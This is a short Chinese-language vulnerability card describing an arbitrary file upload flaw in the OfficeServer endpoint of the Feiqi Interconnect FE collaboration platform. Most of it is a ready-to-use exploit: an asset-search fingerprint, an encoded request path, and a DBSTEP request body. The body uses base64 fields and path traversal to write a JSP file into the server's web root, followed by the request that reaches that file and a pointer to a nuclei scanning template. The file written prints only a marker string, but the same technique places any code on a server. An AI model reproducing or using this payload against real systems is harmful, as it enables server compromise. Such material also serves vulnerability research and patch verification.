# 飞企互联FE业务协作平台OfficeServer任意文件上传漏洞

- **系统**：飞企互联FE业务协作平台OfficeServer　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name=="飞企互联 FE 6.0+"`
- **请求**：`POST /iweboffice/OfficeServer.js%70 HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 185`

**请求体 / payload**
```
DBSTEP V3.0     93                     0        28              DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
RECORDID=Li4vLi4vLi4vamJvc3Mvd2ViL2ZlLndhci91aWQuanNw
<%out.println("lOKB4C9g");%>

上传文件位置
GET /uid.jsp;.js HTTP/1.1
Host: {hostname}
Cookie: JSESSIONID=C02FFC1F802DE5889538E7D4DA810501

nuclei脚本\
\[飞企互联fe-officeserver-任意文件上传.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 飞企互联FE业务协作平台OfficeServer任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 飞企互联FE业务协作平台